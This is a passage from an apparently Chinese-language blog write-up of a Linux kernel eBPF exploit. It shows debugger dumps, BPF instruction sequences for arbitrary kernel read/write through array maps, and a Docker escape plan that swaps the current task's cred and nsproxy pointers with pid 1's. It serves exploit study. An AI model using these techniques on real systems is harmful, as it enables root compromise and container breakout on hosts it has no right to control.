jmp    0xffffffffcfbd944a</span><br><span class="line">   0xffffffff83ab2047 &lt;copy_user_generic_unrolled+135&gt; mov    eax, DWORD PTR [rsi]</span><br><span class="line">   0xffffffff83ab2049 &lt;copy_user_generic_unrolled+137&gt; mov    QWORD PTR [rdi], r8</span><br><span class="line"> → 0xffffffff83ab204c &lt;copy_user_generic_unrolled+140&gt; lea    rsi, [rsi+0x8]</span><br><span class="line">   0xffffffff83ab2050 &lt;copy_user_generic_unrolled+144&gt; lea    rdi, [rdi+0x8]</span><br><span class="line">   0xffffffff83ab2054 &lt;copy_user_generic_unrolled+148&gt; dec    ecx</span><br><span class="line">   0xffffffff83ab2056 &lt;copy_user_generic_unrolled+150&gt; jne    0xffffffff83ab2046 &lt;copy_user_generic_unrolled+134&gt;</span><br><span class="line">   0xffffffff83ab2058 &lt;copy_user_generic_unrolled+152&gt; and    edx, edx</span><br><span class="line">   0xffffffff83ab205a &lt;copy_user_generic_unrolled+154&gt; je     0xffffffff83ab206c &lt;copy_user_generic_unrolled+172&gt;</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── source:arch/x86/lib/co[...].S+92 ────</span><br><span class="line">     87         andl $7,%edx</span><br><span class="line">     88         shrl $3,%ecx</span><br><span class="line">     89         jz 20f</span><br><span class="line">     90  18:    movq (%rsi),%r8</span><br><span class="line">     91  19:    movq %r8,(%rdi)</span><br><span class="line"> →   92         leaq 8(%rsi),%rsi</span><br><span class="line">     93         leaq 8(%rdi),%rdi</span><br><span class="line">     94         decl %ecx</span><br><span class="line">     95         jnz 18b</span><br><span class="line">     96  20:    andl %edx,%edx</span><br><span class="line">     97         jz 23f</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, stopped 0xffffffff83ab204c in copy_user_generic_unrolled (), reason: SINGLE STEP</span><br><span class="line">[#1] Id 2, stopped 0xffffffff81218b90 in rebalance_domains (), reason: SINGLE STEP</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0xffffffff83ab204c → copy_user_generic_unrolled()</span><br><span class="line">[#1] 0xffffffff81f222fd → copy_user_generic(len=0x0, from=0x7ffd9acfffe0, to=0xffff88806af87b40)</span><br><span class="line">[#2] 0xffffffff81f222fd → raw_copy_from_user(size=&lt;optimized out&gt;, src=&lt;optimized out&gt;, dst=&lt;optimized out&gt;)</span><br><span class="line">[#3] 0xffffffff81f222fd → _copy_from_user(to=0xffff88806af87b40, from=0x7ffd9acfffe0, n=0x38)</span><br><span class="line">[#4] 0xffffffff82fc0dde → copy_from_user(n=&lt;optimized out&gt;, from=&lt;optimized out&gt;, to=&lt;optimized out&gt;)</span><br><span class="line">[#5] 0xffffffff82fc0dde → copy_msghdr_from_user(kmsg=0xffff88806af87e58, umsg=0x7ffd9acfffe0, save_addr=0x0 &lt;fixed_percpu_data&gt;, iov=0xffff88806af87c60)</span><br><span class="line">[#6] 0xffffffff82fcb7b8 → sendmsg_copy_msghdr(msg=0xffff88806af87e58, umsg=0x7ffd9acfffe0, flags=0x4000, iov=0xffff88806af87c60)</span><br><span class="line">[#7] 0xffffffff82fcb8bf → ___sys_sendmsg(sock=&lt;optimized out&gt;, msg=0x7ffd9acfffe0, msg_sys=0xffff88806af87e58, flags=0x4000, used_address=&lt;optimized out&gt;, allowed_msghdr_flags=&lt;optimized out&gt;)</span><br><span class="line">[#8] 0xffffffff82fcbafc → __sys_sendmsg(fd=&lt;optimized out&gt;, msg=0x7ffd9acfffe0, flags=0x4000, forbid_cmsg_compat=0x1)</span><br><span class="line">[#9] 0xffffffff81007e9c → do_syscall_64(nr=&lt;optimized out&gt;, regs=0xffff88806af87f58)</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  </span><br><span class="line">93              leaq 8(%rdi),%rdi</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span><br><span class="line">$rax   : 0x0000000000000001  →  0x0000000000000001</span><br><span class="line">$rbx   : 0x0000000000000038  →  0x0000000000000038</span><br><span class="line">$rcx   : 0x0000000000000007  →  0x0000000000000007</span><br><span class="line">$rdx   : 0x0000000000000000  →  0x0000000000000000</span><br><span class="line">$rsp   : 0xffff88806af87ad8  →  0xffffffff81f222fd  →  0x2789e8b8ebc48941  →  0x2789e8b8ebc48941</span><br><span class="line">$rbp   : 0x00007ffd9acfffe0  →  0x00007ffd9ad00020  →  0x732f6e75722f0001  →  0x732f6e75722f0001</span><br><span class="line">$rsi   : 0x00007ffd9acfffe8  →  0x0000000000000015  →  0x0000000000000015</span><br><span class="line">$rdi   : 0xffff88806af87b40  →  0x00007ffd9ad00020  →  0x732f6e75722f0001  →  0x732f6e75722f0001</span><br><span class="line">$rip   : 0xffffffff83ab2050  →  0xee75c9ff087f8d48  →  0xee75c9ff087f8d48</span><br><span class="line">$r8    : 0x00007ffd9ad00020  →  0x732f6e75722f0001  →  0x732f6e75722f0001</span><br><span class="line">$r9    : 0xffffed100d5f0f6f  →  0x000000f3f3f3f3f3  →  0x000000f3f3f3f3f3</span><br><span class="line">$r10   : 0xffffed100d5f0f6e  →  0x0000f3f3f3f3f300  →  0x0000f3f3f3f3f300</span><br><span class="line">$r11   : 0xffff88806af87b77  →  0xff888066060848ff  →  0xff888066060848ff</span><br><span class="line">$r12   : 0x00007ffd9ad00018  →  0x00007f6a1c969483  →  0x000154880fc08548  →  0x000154880fc08548</span><br><span class="line">$r13   : 0xffff88806af87b40  →  0x00007ffd9ad00020  →  0x732f6e75722f0001  →  0x732f6e75722f0001</span><br><span class="line">$r14   : 0x00007ffffffff000  →  0x00007ffffffff000</span><br><span class="line">$r15   : 0x0000000000000000  →  0x0000000000000000</span><br><span class="line">$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x0010 $ss: 0x0018 $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 </span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xffff88806af87ad8│+0x0000: 0xffffffff81f222fd  →  0x2789e8b8ebc48941  →  0x2789e8b8ebc48941     ← $rsp</span><br><span class="line">0xffff88806af87ae0│+0x0008: 0xffff88806af87e58  →  0xffff88806af87d20  →  0x0000000041b58ab3  →  0x0000000041b58ab3</span><br><span class="line">0xffff88806af87ae8│+0x0010: 0x1ffff1100d5f0f64  →  0x1ffff1100d5f0f64</span><br><span class="line">0xffff88806af87af0│+0x0018: 0x00007ffd9acfffe0  →  0x00007ffd9ad00020  →  0x732f6e75722f0001  →  0x732f6e75722f0001</span><br><span class="line">0xffff88806af87af8│+0x0020: 0x0000000000000000  →  0x0000000000000000</span><br><span class="line">0xffff88806af87b00│+0x0028: 0xffff88806af87c60  →  0xffff88806af87c80  →  0xffffffff812ca7f0  →  0xfc0000000000b848  →  0xfc0000000000b848</span><br><span class="line">0xffff88806af87b08│+0x0030: 0xdffffc0000000000  →  0xdffffc0000000000</span><br><span class="line">0xffff88806af87b10│+0x0038: 0xffffffff82fc0dde  →  0xc68948c48949ff31  →  0xc68948c48949ff31</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0xffffffff83ab2045 &lt;copy_user_generic_unrolled+133&gt; adc    cl, BYTE PTR [rbx+rcx*4+0x6]</span><br><span class="line">   0xffffffff83ab2049 &lt;copy_user_generic_unrolled+137&gt; mov    QWORD PTR [rdi], r8</span><br><span class="line">   0xffffffff83ab204c &lt;copy_user_generic_unrolled+140&gt; lea    rsi, [rsi+0x8]</span><br><span class="line"> → 0xffffffff83ab2050 &lt;copy_user_generic_unrolled+144&gt; lea    rdi, [rdi+0x8]</span><br><span class="line">   0xffffffff83ab2054 &lt;copy_user_generic_unrolled+148&gt; dec    ecx</span><br><span class="line">   0xffffffff83ab2056 &lt;copy_user_generic_unrolled+150&gt; jne    0xffffffff83ab2046 &lt;copy_user_generic_unrolled+134&gt;</span><br><span class="line">   0xffffffff83ab2058 &lt;copy_user_generic_unrolled+152&gt; and    edx, edx</span><br><span class="line">   0xffffffff83ab205a &lt;copy_user_generic_unrolled+154&gt; je     0xffffffff83ab206c &lt;copy_user_generic_unrolled+172&gt;</span><br><span class="line">   0xffffffff83ab205c &lt;copy_user_generic_unrolled+156&gt; mov    ecx, edx</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── source:arch/x86/lib/co[...].S+93 ────</span><br><span class="line">     88         shrl $3,%ecx</span><br><span class="line">     89         jz 20f</span><br><span class="line">     90  18:    movq (%rsi),%r8</span><br><span class="line">     91  19:    movq %r8,(%rdi)</span><br><span class="line">     92         leaq 8(%rsi),%rsi</span><br><span class="line"> →   93         leaq 8(%rdi),%rdi</span><br><span class="line">     94         decl %ecx</span><br><span class="line">     95         jnz 18b</span><br><span class="line">     96  20:    andl %edx,%edx</span><br><span class="line">     97         jz 23f</span><br><span class="line">     98         movl %edx,%ecx</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, stopped 0xffffffff83ab2050 in copy_user_generic_unrolled (), reason: SINGLE STEP</span><br><span class="line">[#1] Id 2, stopped 0xffffffff81218b90 in rebalance_domains (), reason: SINGLE STEP</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0xffffffff83ab2050 → copy_user_generic_unrolled()</span><br><span class="line">[#1] 0xffffffff81f222fd → copy_user_generic(len=0x0, from=0x7ffd9acfffe8, to=0xffff88806af87b40)</span><br><span class="line">[#2] 0xffffffff81f222fd → raw_copy_from_user(size=&lt;optimized out&gt;, src=&lt;optimized out&gt;, dst=&lt;optimized out&gt;)</span><br><span class="line">[#3] 0xffffffff81f222fd → _copy_from_user(to=0xffff88806af87b40, from=0x7ffd9acfffe0, n=0x38)</span><br><span class="line">[#4] 0xffffffff82fc0dde → copy_from_user(n=&lt;optimized out&gt;, from=&lt;optimized out&gt;, to=&lt;optimized out&gt;)</span><br><span class="line">[#5] 0xffffffff82fc0dde → copy_msghdr_from_user(kmsg=0xffff88806af87e58, umsg=0x7ffd9acfffe0, save_addr=0x0 &lt;fixed_percpu_data&gt;, iov=0xffff88806af87c60)</span><br><span class="line">[#6] 0xffffffff82fcb7b8 → sendmsg_copy_msghdr(msg=0xffff88806af87e58, umsg=0x7ffd9acfffe0, flags=0x4000, iov=0xffff88806af87c60)</span><br><span class="line">[#7] 0xffffffff82fcb8bf → ___sys_sendmsg(sock=&lt;optimized out&gt;, msg=0x7ffd9acfffe0, msg_sys=0xffff88806af87e58, flags=0x4000, used_address=&lt;optimized out&gt;, allowed_msghdr_flags=&lt;optimized out&gt;)</span><br><span class="line">[#8] 0xffffffff82fcbafc → __sys_sendmsg(fd=&lt;optimized out&gt;, msg=0x7ffd9acfffe0, flags=0x4000, forbid_cmsg_compat=0x1)</span><br><span class="line">[#9] 0xffffffff81007e9c → do_syscall_64(nr=&lt;optimized out&gt;, regs=0xffff88806af87f58)</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  </span><br><span class="line">94              decl %ecx</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span><br><span class="line">$rax   : 0x0000000000000001  →  0x0000000000000001</span><br><span class="line">$rbx   : 0x0000000000000038  →  0x0000000000000038</span><br><span class="line">$rcx   : 0x0000000000000007  →  0x0000000000000007</span><br><span class="line">$rdx   : 0x0000000000000000  →  0x0000000000000000</span><br><span class="line">$rsp   : 0xffff88806af87ad8  →  0xffffffff81f222fd  →  0x2789e8b8ebc48941  →  0x2789e8b8ebc48941</span><br><span class="line">$rbp   : 0x00007ffd9acfffe0  →  0x00007ffd9ad00020  →  0x732f6e75722f0001  →  0x732f6e75722f0001</span><br><span class="line">$rsi   : 0x00007ffd9acfffe8  →  0x0000000000000015  →  0x0000000000000015</span><br><span class="line">$rdi   : 0xffff88806af87b48  →  0xffff888066060850  →   (bad) </span><br><span class="line">$rip   : 0xffffffff83ab2054  →  0x1074d221ee75c9ff  →  0x1074d221ee75c9ff</span><br><span class="line">$r8    : 0x00007ffd9ad00020  →  0x732f6e75722f0001  →  0x732f6e75722f0001</span><br><span class="line">$r9    : 0xffffed100d5f0f6f  →  0x000000f3f3f3f3f3  →  0x000000f3f3f3f3f3</span><br><span class="line">$r10   : 0xffffed100d5f0f6e  →  0x0000f3f3f3f3f300  →  0x0000f3f3f3f3f300</span><br><span class="line">$r11   : 0xffff88806af87b77  →  0xff888066060848ff  →  0xff888066060848ff</span><br><span class="line">$r12   : 0x00007ffd9ad00018  →  0x00007f6a1c969483  →  0x000154880fc08548  →  0x000154880fc08548</span><br><span class="line">$r13   : 0xffff88806af87b40  →  0x00007ffd9ad00020  →  0x732f6e75722f0001  →  0x732f6e75722f0001</span><br><span class="line">$r14   : 0x00007ffffffff000  →  0x00007ffffffff000</span><br><span class="line">$r15   : 0x0000000000000000  →  0x0000000000000000</span><br><span class="line">$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x0010 $ss: 0x0018 $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 </span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xffff88806af87ad8│+0x0000: 0xffffffff81f222fd  →  0x2789e8b8ebc48941  →  0x2789e8b8ebc48941     ← $rsp</span><br><span class="line">0xffff88806af87ae0│+0x0008: 0xffff88806af87e58  →  0xffff88806af87d20  →  0x0000000041b58ab3  →  0x0000000041b58ab3</span><br><span class="line">0xffff88806af87ae8│+0x0010: 0x1ffff1100d5f0f64  →  0x1ffff1100d5f0f64</span><br><span class="line">0xffff88806af87af0│+0x0018: 0x00007ffd9acfffe0  →  0x00007ffd9ad00020  →  0x732f6e75722f0001  →  0x732f6e75722f0001</span><br><span class="line">0xffff88806af87af8│+0x0020: 0x0000000000000000  →  0x0000000000000000</span><br><span class="line">0xffff88806af87b00│+0x0028: 0xffff88806af87c60  →  0xffff88806af87c80  →  0xffffffff812ca7f0  →  0xfc0000000000b848  →  0xfc0000000000b848</span><br><span class="line">0xffff88806af87b08│+0x0030: 0xdffffc0000000000  →  0xdffffc0000000000</span><br><span class="line">0xffff88806af87b10│+0x0038: 0xffffffff82fc0dde  →  0xc68948c48949ff31  →  0xc68948c48949ff31</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0xffffffff83ab2049 &lt;copy_user_generic_unrolled+137&gt; mov    QWORD PTR [rdi], r8</span><br><span class="line">   0xffffffff83ab204c &lt;copy_user_generic_unrolled+140&gt; lea    rsi, [rsi+0x8]</span><br><span class="line">   0xffffffff83ab2050 &lt;copy_user_generic_unrolled+144&gt; lea    rdi, [rdi+0x8]</span><br><span class="line"> → 0xffffffff83ab2054 &lt;copy_user_generic_unrolled+148&gt; dec    ecx</span><br><span class="line">   0xffffffff83ab2056 &lt;copy_user_generic_unrolled+150&gt; jne    0xffffffff83ab2046 &lt;copy_user_generic_unrolled+134&gt;</span><br><span class="line">   0xffffffff83ab2058 &lt;copy_user_generic_unrolled+152&gt; and    edx, edx</span><br><span class="line">   0xffffffff83ab205a &lt;copy_user_generic_unrolled+154&gt; je     0xffffffff83ab206c &lt;copy_user_generic_unrolled+172&gt;</span><br><span class="line">   0xffffffff83ab205c &lt;copy_user_generic_unrolled+156&gt; mov    ecx, edx</span><br><span class="line">   0xffffffff83ab205e &lt;copy_user_generic_unrolled+158&gt; mov    al, BYTE PTR [rsi]</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── source:arch/x86/lib/co[...].S+94 ────</span><br><span class="line">     89         jz 20f</span><br><span class="line">     90  18:    movq (%rsi),%r8</span><br><span class="line">     91  19:    movq %r8,(%rdi)</span><br><span class="line">     92         leaq 8(%rsi),%rsi</span><br><span class="line">     93         leaq 8(%rdi),%rdi</span><br><span class="line"> →   94         decl %ecx</span><br><span class="line">     95         jnz 18b</span><br><span class="line">     96  20:    andl %edx,%edx</span><br><span class="line">     97         jz 23f</span><br><span class="line">     98         movl %edx,%ecx</span><br><span class="line">     99  21:    movb (%rsi),%al</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, stopped 0xffffffff83ab2054 in copy_user_generic_unrolled (), reason: SINGLE STEP</span><br><span class="line">[#1] Id 2, stopped 0xffffffff81218b90 in rebalance_domains (), reason: SINGLE STEP</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0xffffffff83ab2054 → copy_user_generic_unrolled()</span><br><span class="line">[#1] 0xffffffff81f222fd → copy_user_generic(len=0x0, from=0x7ffd9acfffe8, to=0xffff88806af87b48)</span><br><span class="line">[#2] 0xffffffff81f222fd → raw_copy_from_user(size=&lt;optimized out&gt;, src=&lt;optimized out&gt;, dst=&lt;optimized out&gt;)</span><br><span class="line">[#3] 0xffffffff81f222fd → _copy_from_user(to=0xffff88806af87b40, from=0x7ffd9acfffe0, n=0x38)</span><br><span class="line">[#4] 0xffffffff82fc0dde → copy_from_user(n=&lt;optimized out&gt;, from=&lt;optimized out&gt;, to=&lt;optimized out&gt;)</span><br><span class="line">[#5] 0xffffffff82fc0dde → copy_msghdr_from_user(kmsg=0xffff88806af87e58, umsg=0x7ffd9acfffe0, save_addr=0x0 &lt;fixed_percpu_data&gt;, iov=0xffff88806af87c60)</span><br><span class="line">[#6] 0xffffffff82fcb7b8 → sendmsg_copy_msghdr(msg=0xffff88806af87e58, umsg=0x7ffd9acfffe0, flags=0x4000, iov=0xffff88806af87c60)</span><br><span class="line">[#7] 0xffffffff82fcb8bf → ___sys_sendmsg(sock=&lt;optimized out&gt;, msg=0x7ffd9acfffe0, msg_sys=0xffff88806af87e58, flags=0x4000, used_address=&lt;optimized out&gt;, allowed_msghdr_flags=&lt;optimized out&gt;)</span><br><span class="line">[#8] 0xffffffff82fcbafc → __sys_sendmsg(fd=&lt;optimized out&gt;, msg=0x7ffd9acfffe0, flags=0x4000, forbid_cmsg_compat=0x1)</span><br><span class="line">[#9] 0xffffffff81007e9c → do_syscall_64(nr=&lt;optimized out&gt;, regs=0xffff88806af87f58)</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  info registers cr4</span><br><span class="line">cr4            0x3006f0            [ SMAP SMEP OSXMMEXCPT OSFXSR PGE MCE PAE PSE ]</span><br></pre></td></tr></table></figure><h3 id="0x02-从map读任意值"><a href="#0x02-从map读任意值" class="headerlink" title="0x02 从map读任意值"></a>0x02 从map读任意值</h3><p>思路是这样，参考安全客，我们利用操作将r6置为1（内核认为是0），然后将从map读一个值到r8，然后，r6乘r8,这样就可以任意地址读写了，想象很美好，发现相乘之后，r6的就成未知状态了。。。。</p><h4 id="0x00-绕过"><a href="#0x00-绕过" class="headerlink" title="0x00 绕过"></a>0x00 绕过</h4><p>既然这样不信，我觉得可以采用多次bpf程序的方法，就是每次load程序只用一次，用完之后close这个bpf程序，然后修改和r6相乘的立即数，从而实现任意读写，然后发现mov的时候，立即数只能是32位，那么，可以通过，以下操作实现，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov r8,r6</span><br><span class="line">mul r6,low 32bit</span><br><span class="line">mul r8,high 32bit</span><br><span class="line">r8=&lt;&lt;32</span><br><span class="line">add r6,r8</span><br></pre></td></tr></table></figure><p>其实最简单的就是通过BPF_LD_IMM64指令来做这个操作，然后发现map的最大的value size是32bit，也是就说，还是不能任意读写，只能向后越界读写4gb，所以，下面，还有一种思路，既然，key和value的类型都是u32,以array为例，当你look_up_elem会调用array_map_lookup_elem</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">static void *array_map_lookup_elem(struct bpf_map *map, void *key)</span><br><span class="line">&#123;</span><br><span class="line">struct bpf_array *array = container_of(map, struct bpf_array, map);</span><br><span class="line">u32 index = *(u32 *)key;</span><br><span class="line"></span><br><span class="line">if (unlikely(index &gt;= array-&gt;map.max_entries))</span><br><span class="line">return NULL;</span><br><span class="line"></span><br><span class="line">return array-&gt;value + array-&gt;elem_size * (index &amp; array-&gt;index_mask);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么看这个函数，如果我们把elem_size、index_mask和max_entries改成0xffffffff，这样的话，下一次load map时候，就可以实现任意地址读写，有点复杂，就没去试，应该可行，当时没那样做是因为，分割地址，太复杂了，现在想想，没有这么复杂，你想任意读写一个地址，你只需要把</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">offset_address=address-array-&gt;value</span><br><span class="line">index=offset_address&gt;&gt;32</span><br><span class="line">offset=offset_address%0x100000000</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">      BPF_ALU64_IMM(BPF_MOV,BPF_REG_6,index),</span><br><span class="line">      BPF_STX_MEM(BPF_DW,BPF_REG_10,BPF_REG_6,-8),</span><br><span class="line">      BPF_MOV64_REG(BPF_REG_2,BPF_REG_10),</span><br><span class="line">      BPF_ADD64_IMM(BPF_REG_2,-8),</span><br><span class="line">      BPF_LD_MAP_FD(BPF_REG_1,cmd_fd),</span><br><span class="line">      BPF_MAP_LOOKUP(),</span><br><span class="line">      BPF_JMP_IMM(BPF_JNE,BPF_REG_0,0,1),</span><br><span class="line">      BPF_EXIT_INSN(),</span><br><span class="line">      BPF_LDX_MEM(BPF_DW,BPF_REG_6,BPF_REG_0,offset),</span><br><span class="line">BPF_ALU64_IMM(BPF_MOV,BPF_REG_0,0)</span><br></pre></td></tr></table></figure><p>应该能成功，如果check不过，可以考虑将r6=1（内核认为是0），然后mul r6,index，这样应该能够成功</p><h1 id="0x05-提权并docker逃逸"><a href="#0x05-提权并docker逃逸" class="headerlink" title="0x05 提权并docker逃逸"></a>0x05 提权并docker逃逸</h1><p>当时我其他任意读写的方案都被否决之后，我只能按照zdi的方法提权，这个漏洞是可以docker逃逸的，参考</p><ul><li><a href="https://xz.aliyun.com/t/6167" target="_blank" rel="noopener">https://xz.aliyun.com/t/6167</a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">使用内核漏洞进入内核上下文</span><br><span class="line">获取当前进程的task struct</span><br><span class="line">回溯 task list 获取 pid = 1 的 task struct，复制其相关数据</span><br><span class="line">切换当前 namespace</span><br><span class="line">打开 root shell，完成逃逸</span><br></pre></td></tr></table></figure><p>然后就是zdi就是这种提权方法，首先说个小坑，因为是zdi那种方法是任意读写4个字节,然而我们读一个地址是8个字节，这样的话，就免不了强制转换，强制转换的话建议用unsigned int 而不是int，因为如果用int转换成uint64_t 的时候符号位会扩展，导致低32位扩展的时候，高32位全为1，导致任意地址读对了，但是解析错了，后面用的也错了</p><p>如果我们要用这个漏洞逃逸的话，我们首先得有一些预备知识，zdi也讲了，这里说一下</p><h2 id="0x00-init-pid-ns"><a href="#0x00-init-pid-ns" class="headerlink" title="0x00 init_pid_ns"></a>0x00 init_pid_ns</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">struct pid_namespace init_pid_ns = &#123;</span><br><span class="line">.kref = KREF_INIT(2),</span><br><span class="line">.idr = IDR_INIT(init_pid_ns.idr),</span><br><span class="line">.pid_allocated = PIDNS_ADDING,</span><br><span class="line">.level = 0,</span><br><span class="line">.child_reaper = &amp;init_task,</span><br><span class="line">.user_ns = &amp;init_user_ns,</span><br><span class="line">.ns.inum = PROC_PID_INIT_INO,</span><br><span class="line">#ifdef CONFIG_PID_NS</span><br><span class="line">.ns.ops = &amp;pidns_operations,</span><br><span class="line">#endif</span><br><span class="line">&#125;;</span><br><span class="line">EXPORT_SYMBOL_GPL(init_pid_ns);</span><br></pre></td></tr></table></figure><p>init_pid_ns 是一个全局变量，所以我们可以通过偏移找到他，是进程默认的namespace，然后看到child_reaper有init_task的地址，init_task就是我们pid 1的地址，然后，在task_struct结构体中，有一个tasks的结构体，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct list_headtasks;</span><br></pre></td></tr></table></figure><p>用于把所有的进程都串联起来，在普及一下list_head结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">struct list_head &#123;</span><br><span class="line">struct list_head *next, *prev;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>他有两个成员，next和prev，在task_struct中，this_task.tasks-&gt;next=next_task.tasks,所以，我们就一个遍历所有的进程，找到自己的进程通过比较pid</p><p>task_struct还有一个结构体指针</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/* Namespaces: */</span><br><span class="line">struct nsproxy*nsproxy;</span><br></pre></td></tr></table></figure><p>这个就是进程的namespaces啦，所以，我们改他就可以逃逸了</p><h2 id="0x01-逃逸思路"><a href="#0x01-逃逸思路" class="headerlink" title="0x01 逃逸思路"></a>0x01 逃逸思路</h2><p>首先通过leak ops address和任意读，leak init_task的address，然后通过tasks链表，遍历系统所有进程找到自己进程的地址，然后，改自己的cred结构体地址为pid 1的cred结构体地址，把的nsproxy的结构体地址为pid 1的nsproxy的结构体地址，最后还有个小问题，就是，如果你这样做了，在拿到root shell之后，exit，kasan 就会检测到uaf，这是因为nsproxy和cred结构体都有一个usage的变量，用来记录引用的次数，但是，由于，我们是直接引用的，没有加usage，导致的还有引用的时候，把cred和nsproxy结构体free掉了，造成uaf，所以，我们手动加一下就很完美了</p><h2 id="0x02-运行效果"><a href="#0x02-运行效果" class="headerlink" title="0x02 运行效果"></a>0x02 运行效果</h2><p>遍历系统所有进程的时候，还挺有意思的，感觉自己跟god一样 hhh，完整exploit不放了，给一下运行时的log</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 